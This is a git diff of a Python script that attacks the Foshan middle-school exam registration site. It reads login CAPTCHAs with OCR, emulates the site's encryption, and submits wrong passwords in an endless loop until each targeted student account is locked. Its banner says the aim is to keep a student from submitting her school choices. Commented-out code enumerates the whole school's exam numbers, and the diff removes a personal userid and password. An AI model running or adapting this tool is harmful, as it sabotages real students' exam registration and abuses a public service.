@@ -1,28 +1,32 @@
 '''
 Author: whalefall
 Date: 2021-03-20 16:37:34
-LastEditTime: 2021-03-28 10:58:42
+LastEditTime: 2021-03-28 12:38:33
 Description: 中考报名网站
 '''
 import base64
+# 懒得研究/复写他的加密算法 直接用execjs模拟
+import configparser
+import datetime
 import hashlib
+import os
 import random
 import re
+import sys
+import threading
 # from Crypto.Cipher import AES # 没能力复写JS加密 弃用
 import time
+from ast import literal_eval  # 字符串列表转列表
+from concurrent.futures import ThreadPoolExecutor
 from io import BytesIO
 
+import execjs
 # 验证码
 import pytesseract
 import requests
 from lxml import etree
 from PIL import Image
-import execjs
-import os
-import datetime
-from concurrent.futures import ThreadPoolExecutor
-import threading
-# 懒得研究/复写他的加密算法 直接用execjs模拟
+import traceback
 
 
 class Encrypt:
@@ -244,6 +248,7 @@ class Zkweb:
             print("验证码识别有误:%s" % (code))
             return False
 
+        # 可能账号密码不存在之类的
         elif "[规则]登录失败！" in resp.text:
 
             print("登录受限!")
@@ -330,24 +335,56 @@ class Zkweb:
             print("[Error]HTML解析失败!", e)
             return (False,)
 
+# 获取配置文件
+
+
+def getConfig():
+    config = configparser.ConfigParser()
+    path_py = os.path.split(os.path.realpath(sys.argv[0]))[0]
+    print("脚本目录:", path_py)
+    path_config = os.path.join(path_py, "config.ini")
+
+    if os.path.exists(path_config):
+
+        config.read(path_config, encoding="utf-8")
+        # 获取配置
+        UserList = config.get("common", "UserList")
+        checkTime = config.get("common", "checkTime")
+
+        print('''
+    #################config.ini#####################
+    #     请核对配置信息!首次试用请修改config.ini
+    ################################################
+    UserList(用户列表):%s
+    checkTime(检查时间):%s
+    ################################################
+            ''' % (UserList, checkTime)
+              )
+
+    else:
+        config.add_section("common")
+        config.set("common", "UserList", "[611,815,655]")  # 开头不能为0
+        config.set("common", "checkTime", "60")
+        print("首次使用 请修改config.ini内容")
+        config.write(open(path_config, "w"))
+
+    # print(literal_eval(UserList))
+    return literal_eval(UserList), int(checkTime)
+
 
 # 主函数
 def main(userid, pwd):
-    # lock.acquire()
+
+    # 在循环外实例化对象 保留count计数器
 
     bot = Zkweb()
 
-    # userid = "21060515080713"
-    # pwd = "@lovehyy123456"
-
-    # for i in range(5):
     try:
         i = 0
         while True:
             i += 1
             print("----------------%s第%s次请求----------------" % (userid, i))
             code = bot.checkCode()
-
             loginStatus = bot.login(code, userid, pwd)
 
             if loginStatus == "Error":
@@ -362,15 +399,19 @@ def main(userid, pwd):
 #    账号:%s 成功被锁定!
 ################################
                 ''' % (time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()), userid))
-                with open(os.path.join(os.path.abspath(os.path.dirname(__file__)), "result.txt"), mode="a") as txt:
-                    txt.write('''
-################################
-#    时间:%s
-#    账号:%s 成功被锁定!
-################################
-                    ''' % (time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()), userid))
 
-                break
+# 锁定成功后的操作
+#                 with open(os.path.join(os.path.abspath(os.path.dirname(__file__)), "result.txt"), mode="a") as txt:
+#                     txt.write('''
+# ################################
+# #    时间:%s
+# #    账号:%s 成功被锁定!
+# ################################
+#                     ''' % (time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()), userid))
+
+                return "Suc"
+
+                # break
 
             elif loginStatus == "apiError":
                 print("接口错误!")
@@ -381,6 +422,7 @@ def main(userid, pwd):
                 # print("")
                 continue
 
+            # 规则[登录失败!]
             elif loginStatus == "resqError":
                 # print("")
                 break
@@ -396,17 +438,76 @@ def main(userid, pwd):
             else:
                 pass
                 # time.sleep(2)
-    finally:
-        # lock.release()
-        pass
+
+    except Exception as e:
+        print('''
+##############出现错误############
+# 用户ID:%s
+# 错误信息:
+# %s
+##################################        
+        ''' % (userid, traceback.format_exc()))
+
+    # finally:
+    #     return "continue"
 
 
 if __name__ == "__main__":
+    print('''
+    ###############佛山中考报名网站##########################################
+    # GitHub:https://github.com/AdminWhaleFall/FsZkWeb
+    ########################################################################
+    # 1. 修改config.ini为你想锁定的账号
+    # 2. checkTime检查时间
+    # 3. 本程序只用于恶搞,使她登不上报名账号提交不了志愿。
+    ################################################
+            '''
+          )
 
+    # time.sleep(2)
+
+
+    try:
+        UserList, checkTime = getConfig()
+    except Exception as e:
+        print("[Config]配置文件有误!请检查后重试", traceback.format_exc())
+        sys.exit()
+
+    i = 0
+    # 不间断循环
+    while True:
+        
+        # print("----------------------第%s次循环遍历!----------------------------" % (i))
+
+        for userID in UserList:
+            result = main("2106051508%04d" % (userID), "@A123456")
+
+            if result == "Suc":
+                # 成功就删除账号
+                UserList.remove(userID)
+                print(userID, "已删除!")
+                print("剩余用户:%s" % (UserList))
+
+        
+        
+
+        if UserList == []:
+            i += 1
+            print("--------------第%s次循环遍历!已完成歇息中----------" % (i))
+            
+            # 间接实现热重载
+
+            UserList, checkTime = getConfig()
+            
+            time.sleep(checkTime)
+            
+
+
+    # 报废代码
+    '''
     # userid = "21060515080101"
     # pwd = "@lov23456"
     # main(userid, pwd)
-
 
     # 构造考号:2106051508|0613
 
@@ -414,18 +515,19 @@ if __name__ == "__main__":
     # import multiprocessing
     # pool = multiprocessing.Pool(processes=3)
 
-    for classId in range(1, 12):
-        for i in range(1, 52):
-            
-            # 女朋友的班级学号 不要搞她
-            if i == 13 and classId == 6:
-                continue
+    # 通过遍历得到全校考号
 
-            # pool.apply_async(func=main, args=(
-            #     "2106051508%02d%02d" % (classId, i), "@A123456",))
-            main("2106051508%02d%02d" % (classId, i), "@A123456")
+    # for classId in range(1, 12):
+    #     for i in range(1, 52):
+
+    #         # 女朋友的班级学号 不要搞她
+    #         if i == 13 and classId == 6:
+    #             continue
+
+    #         # pool.apply_async(func=main, args=(
+    #         #     "2106051508%02d%02d" % (classId, i), "@A123456",))
+    #         main("2106051508%02d%02d" % (classId, i), "@A123456")
 
     # pool.close()
     # pool.join()
-
-    print("执行完毕!")
+    '''
